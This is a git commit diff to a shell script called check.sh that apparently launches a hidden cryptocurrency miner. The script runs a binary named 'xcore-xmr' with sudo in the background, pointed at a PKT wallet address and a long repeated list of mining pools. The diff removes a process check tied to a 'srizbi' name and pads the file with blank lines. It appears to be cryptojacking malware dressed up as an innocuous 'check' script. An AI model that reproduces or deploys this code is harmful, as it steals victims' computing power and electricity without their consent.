4758509dbb29fb2fd08f5fcf92ad7ae5ab843cf3
sippolipo <92656843+sippolipo@users.noreply.github.com>
2021-10-17 09:46:43 +0700

    Update check.sh

--- check.sh
+++ check.sh
@@ -1,10 +1,15 @@
 #!/bin/bash
 
-cd /etc/apt/src/
 
-if [ `ps aux | grep srizbi | wc -l` -gt 0 ]; then
-sleep 8
-else
+
+
+
+
+
+
+
+
+
 sudo ./xcore-xmr ann -p pkt1qjrd7sdpy7zmuvqtlmcrqqw3qmjvmcel6pj7khw http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io http://pool.pktpool.io &
+
 sleep 8
-fi
